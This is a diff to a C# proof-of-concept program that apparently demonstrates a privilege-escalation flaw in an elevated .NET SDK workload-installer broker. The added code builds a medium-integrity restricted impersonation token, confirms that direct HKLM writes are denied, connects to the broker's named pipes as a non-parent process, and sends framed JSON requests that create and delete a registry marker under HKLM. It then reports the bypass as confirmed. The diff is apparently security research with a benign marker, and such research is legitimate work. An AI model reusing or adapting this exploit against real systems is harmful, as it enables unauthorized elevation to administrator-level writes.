@@ -37,6 +37,13 @@ internal static class Program
                 expectedParentPid: int.Parse(args[2]));
         }
 
+        if (args.Length > 0 && args[0] == "attacker-medium")
+        {
+            return RunMediumImpersonatedAttacker(
+                serverPid: int.Parse(args[1]),
+                expectedParentPid: int.Parse(args[2]));
+        }
+
         return await RunParentAsync();
     }
 
@@ -76,23 +83,44 @@ internal static class Program
 
         Console.WriteLine($"SERVER_PID={server.Id}");
 
-        string evidencePath = Path.Combine(Path.GetTempPath(), $"sdk-pipe-medium-{Guid.NewGuid():N}.txt");
-        int attackerExit = await LaunchMediumIntegrityAttackerAsync(
-            dotnet,
-            dll,
-            server.Id,
-            Environment.ProcessId,
-            evidencePath);
+        var attackerStart = new ProcessStartInfo
+        {
+            FileName = dotnet,
+            Arguments = $"\"{dll}\" attacker-medium {server.Id} {Environment.ProcessId}",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            CreateNoWindow = true,
+        };
 
-        string attackerStdout = File.Exists(evidencePath)
-            ? await File.ReadAllTextAsync(evidencePath)
-            : string.Empty;
+        using Process attacker = Process.Start(attackerStart)
+            ?? throw new InvalidOperationException("Failed to start medium-control attacker process.");
 
-        Console.WriteLine("=== ATTACKER EVIDENCE ===");
+        Task<string> attackerOutTask = attacker.StandardOutput.ReadToEndAsync();
+        Task<string> attackerErrTask = attacker.StandardError.ReadToEndAsync();
+
+        Task exited = attacker.WaitForExitAsync();
+        int attackerExit;
+        if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(25))) != exited)
+        {
+            Console.WriteLine($"MEDIUM_ATTACKER_TIMEOUT_PID={attacker.Id}");
+            try { attacker.Kill(entireProcessTree: true); } catch { }
+            try { await attacker.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(5)); } catch { }
+            attackerExit = 124;
+        }
+        else
+        {
+            attackerExit = attacker.ExitCode;
+        }
+
+        string attackerStdout = await attackerOutTask;
+        string attackerStderr = await attackerErrTask;
+
+        Console.WriteLine("=== ATTACKER STDOUT ===");
         Console.Write(attackerStdout);
+        Console.WriteLine("=== ATTACKER STDERR ===");
+        Console.Write(attackerStderr);
         Console.WriteLine($"ATTACKER_EXIT={attackerExit}");
-
-        try { File.Delete(evidencePath); } catch { }
 
         if (!server.HasExited)
         {
@@ -297,6 +325,312 @@ internal static class Program
         }
         catch (Exception ex) when (ex is OperationCanceledException or IOException or ObjectDisposedException)
         {
+        }
+    }
+
+
+    private static int RunMediumImpersonatedAttacker(int serverPid, int expectedParentPid)
+    {
+        IntPtr mediumImpersonationToken = CreateMediumRestrictedImpersonationToken();
+        try
+        {
+            if (!SetThreadToken(IntPtr.Zero, mediumImpersonationToken))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetThreadToken failed");
+            }
+
+            Console.WriteLine("MEDIUM_THREAD_IMPERSONATION_ACTIVE=True");
+            return RunAttackerSync(serverPid, expectedParentPid);
+        }
+        finally
+        {
+            RevertToSelf();
+            if (mediumImpersonationToken != IntPtr.Zero)
+            {
+                CloseHandle(mediumImpersonationToken);
+            }
+        }
+    }
+
+    private static int RunAttackerSync(int serverPid, int expectedParentPid)
+    {
+        Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
+        Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
+        Console.WriteLine($"ATTACKER_DIFFERS_FROM_PARENT={Environment.ProcessId != expectedParentPid}");
+        Console.WriteLine($"ATTACKER_INTEGRITY_SID={GetEffectiveIntegritySid()}");
+
+        string architecture = RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant();
+        string directMarkerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\research.pipe-hijack.direct-attacker";
+
+        bool directWriteAllowed = false;
+        try
+        {
+            using RegistryKey? direct = Registry.LocalMachine.CreateSubKey(directMarkerPath, writable: true);
+            directWriteAllowed = direct is not null;
+            if (directWriteAllowed)
+            {
+                Registry.LocalMachine.DeleteSubKeyTree(directMarkerPath, throwOnMissingSubKey: false);
+            }
+        }
+        catch (Exception ex) when (ex is UnauthorizedAccessException or System.Security.SecurityException)
+        {
+        }
+
+        Console.WriteLine($"ATTACKER_DIRECT_HKLM_WRITE_ALLOWED={directWriteAllowed}");
+
+        string dispatchPipeName = CreatePipeName(serverPid);
+        string logPipeName = CreatePipeName(serverPid, "log");
+        Console.WriteLine($"DISPATCH_PIPE={dispatchPipeName}");
+        Console.WriteLine($"LOG_PIPE={logPipeName}");
+
+        using var dispatch = new NamedPipeClientStream(".", dispatchPipeName, PipeDirection.InOut, PipeOptions.None);
+        using var log = new NamedPipeClientStream(".", logPipeName, PipeDirection.InOut, PipeOptions.None);
+
+        try
+        {
+            dispatch.Connect(5000);
+            Console.WriteLine("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True");
+        }
+        catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
+        {
+            Console.WriteLine($"DISPATCH_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
+            return 3;
+        }
+
+        try
+        {
+            log.Connect(5000);
+            Console.WriteLine("LOG_PIPE_CONNECTED_BY_NON_PARENT=True");
+        }
+        catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
+        {
+            Console.WriteLine($"LOG_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
+            return 3;
+        }
+
+        string markerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\{MarkerWorkload}";
+
+        string writeResponse = SendRequestSync(dispatch, new
+        {
+            WorkloadId = MarkerWorkload,
+            RequestType = 400,
+            SdkFeatureBand = FeatureBand,
+        });
+        Console.WriteLine($"WRITE_RESPONSE={writeResponse}");
+
+        bool created = Registry.LocalMachine.OpenSubKey(markerPath) is RegistryKey;
+        Console.WriteLine($"HKLM_MARKER_PATH={markerPath}");
+        Console.WriteLine($"HKLM_MARKER_CREATED={created}");
+
+        string deleteResponse = SendRequestSync(dispatch, new
+        {
+            WorkloadId = MarkerWorkload,
+            RequestType = 401,
+            SdkFeatureBand = FeatureBand,
+        });
+        Console.WriteLine($"DELETE_RESPONSE={deleteResponse}");
+
+        bool cleaned = Registry.LocalMachine.OpenSubKey(markerPath) is null;
+        Console.WriteLine($"HKLM_MARKER_CLEANED={cleaned}");
+
+        string shutdownResponse = SendRequestSync(dispatch, new { RequestType = 0 });
+        Console.WriteLine($"SHUTDOWN_RESPONSE={shutdownResponse}");
+
+        bool confirmed =
+            Environment.ProcessId != expectedParentPid &&
+            GetEffectiveIntegritySid() == "S-1-16-8192" &&
+            !directWriteAllowed &&
+            created &&
+            cleaned;
+
+        Console.WriteLine($"ELEVATED_BROKER_MEDIUM_IL_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
+        return confirmed ? 0 : 1;
+    }
+
+    private static string SendRequestSync(NamedPipeClientStream pipe, object request)
+    {
+        byte[] payload = JsonSerializer.SerializeToUtf8Bytes(request);
+        byte[] header = BitConverter.GetBytes(payload.Length);
+        byte[] framed = new byte[header.Length + payload.Length];
+        Buffer.BlockCopy(header, 0, framed, 0, header.Length);
+        Buffer.BlockCopy(payload, 0, framed, header.Length, payload.Length);
+
+        pipe.Write(framed, 0, framed.Length);
+        pipe.Flush();
+
+        byte[] lengthBytes = new byte[4];
+        ReadExactlySync(pipe, lengthBytes);
+        int length = BitConverter.ToInt32(lengthBytes, 0);
+        if (length < 0 || length > 2044)
+        {
+            throw new InvalidDataException($"Unexpected response length: {length}");
+        }
+
+        byte[] response = new byte[length];
+        ReadExactlySync(pipe, response);
+        return Encoding.UTF8.GetString(response);
+    }
+
+    private static void ReadExactlySync(Stream stream, byte[] buffer)
+    {
+        int read = 0;
+        while (read < buffer.Length)
+        {
+            int n = stream.Read(buffer, read, buffer.Length - read);
+            if (n == 0)
+            {
+                throw new EndOfStreamException();
+            }
+            read += n;
+        }
+    }
+
+    private static IntPtr CreateMediumRestrictedImpersonationToken()
+    {
+        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+        const uint TOKEN_DUPLICATE = 0x0002;
+        const uint TOKEN_IMPERSONATE = 0x0004;
+        const uint TOKEN_QUERY = 0x0008;
+        const uint TOKEN_ADJUST_DEFAULT = 0x0080;
+        const uint TOKEN_ADJUST_SESSIONID = 0x0100;
+        const uint DISABLE_MAX_PRIVILEGE = 0x00000001;
+        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
+        const uint SE_GROUP_INTEGRITY = 0x00000020;
+
+        uint desired = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
+        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, desired, out IntPtr currentToken))
+        {
+            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");
+        }
+
+        IntPtr adminSidPtr = IntPtr.Zero;
+        IntPtr mediumSidPtr = IntPtr.Zero;
+        IntPtr tmlPtr = IntPtr.Zero;
+        IntPtr restrictedPrimary = IntPtr.Zero;
+
+        try
+        {
+            var adminSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
+            byte[] adminSidBytes = new byte[adminSid.BinaryLength];
+            adminSid.GetBinaryForm(adminSidBytes, 0);
+            adminSidPtr = Marshal.AllocHGlobal(adminSidBytes.Length);
+            Marshal.Copy(adminSidBytes, 0, adminSidPtr, adminSidBytes.Length);
+
+            var disable = new[]
+            {
+                new SID_AND_ATTRIBUTES
+                {
+                    Sid = adminSidPtr,
+                    Attributes = SE_GROUP_USE_FOR_DENY_ONLY
+                }
+            };
+
+            if (!CreateRestrictedToken(
+                currentToken,
+                DISABLE_MAX_PRIVILEGE,
+                (uint)disable.Length,
+                disable,
+                0,
+                IntPtr.Zero,
+                0,
+                IntPtr.Zero,
+                out restrictedPrimary))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateRestrictedToken failed");
+            }
+
+            var mediumSid = new SecurityIdentifier("S-1-16-8192");
+            byte[] mediumSidBytes = new byte[mediumSid.BinaryLength];
+            mediumSid.GetBinaryForm(mediumSidBytes, 0);
+            mediumSidPtr = Marshal.AllocHGlobal(mediumSidBytes.Length);
+            Marshal.Copy(mediumSidBytes, 0, mediumSidPtr, mediumSidBytes.Length);
+
+            var tml = new TOKEN_MANDATORY_LABEL
+            {
+                Label = new SID_AND_ATTRIBUTES
+                {
+                    Sid = mediumSidPtr,
+                    Attributes = SE_GROUP_INTEGRITY
+                }
+            };
+            tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>());
+            Marshal.StructureToPtr(tml, tmlPtr, false);
+
+            if (!SetTokenInformation(
+                restrictedPrimary,
+                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
+                tmlPtr,
+                Marshal.SizeOf<TOKEN_MANDATORY_LABEL>() + mediumSidBytes.Length))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetTokenInformation(TokenIntegrityLevel) failed");
+            }
+
+            const uint MAXIMUM_ALLOWED = 0x02000000;
+            if (!DuplicateTokenEx(
+                restrictedPrimary,
+                MAXIMUM_ALLOWED,
+                IntPtr.Zero,
+                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                TOKEN_TYPE.TokenImpersonation,
+                out IntPtr impersonationToken))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "DuplicateTokenEx failed");
+            }
+
+            return impersonationToken;
+        }
+        finally
+        {
+            if (restrictedPrimary != IntPtr.Zero) CloseHandle(restrictedPrimary);
+            if (currentToken != IntPtr.Zero) CloseHandle(currentToken);
+            if (tmlPtr != IntPtr.Zero) Marshal.FreeHGlobal(tmlPtr);
+            if (mediumSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(mediumSidPtr);
+            if (adminSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(adminSidPtr);
+        }
+    }
+
+    private static string GetEffectiveIntegritySid()
+    {
+        const uint TOKEN_QUERY = 0x0008;
+        IntPtr token;
+        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, out token))
+        {
+            int error = Marshal.GetLastWin32Error();
+            const int ERROR_NO_TOKEN = 1008;
+            if (error != ERROR_NO_TOKEN || !OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out token))
+            {
+                throw new System.ComponentModel.Win32Exception(error, "Unable to open effective token");
+            }
+        }
+
+        try
+        {
+            _ = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out int length);
+            int error = Marshal.GetLastWin32Error();
+            if (length <= 0)
+            {
+                throw new System.ComponentModel.Win32Exception(error);
+            }
+
+            IntPtr buffer = Marshal.AllocHGlobal(length);
+            try
+            {
+                if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, buffer, length, out _))
+                {
+                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
+                }
+
+                TOKEN_MANDATORY_LABEL label = Marshal.PtrToStructure<TOKEN_MANDATORY_LABEL>(buffer);
+                return new SecurityIdentifier(label.Label.Sid).Value;
+            }
+            finally
+            {
+                Marshal.FreeHGlobal(buffer);
+            }
+        }
+        finally
+        {
+            CloseHandle(token);
         }
     }
 
@@ -629,6 +963,50 @@ internal static class Program
         string? lpCurrentDirectory,
         ref STARTUPINFO lpStartupInfo,
         out PROCESS_INFORMATION lpProcessInformation);
+
+
+    private enum SECURITY_IMPERSONATION_LEVEL
+    {
+        SecurityAnonymous,
+        SecurityIdentification,
+        SecurityImpersonation,
+        SecurityDelegation
+    }
+
+    private enum TOKEN_TYPE
+    {
+        TokenPrimary = 1,
+        TokenImpersonation
+    }
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool DuplicateTokenEx(
+        IntPtr hExistingToken,
+        uint dwDesiredAccess,
+        IntPtr lpTokenAttributes,
+        SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
+        TOKEN_TYPE TokenType,
+        out IntPtr phNewToken);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool RevertToSelf();
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool OpenThreadToken(
+        IntPtr ThreadHandle,
+        uint DesiredAccess,
+        [MarshalAs(UnmanagedType.Bool)] bool OpenAsSelf,
+        out IntPtr TokenHandle);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetCurrentThread();
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
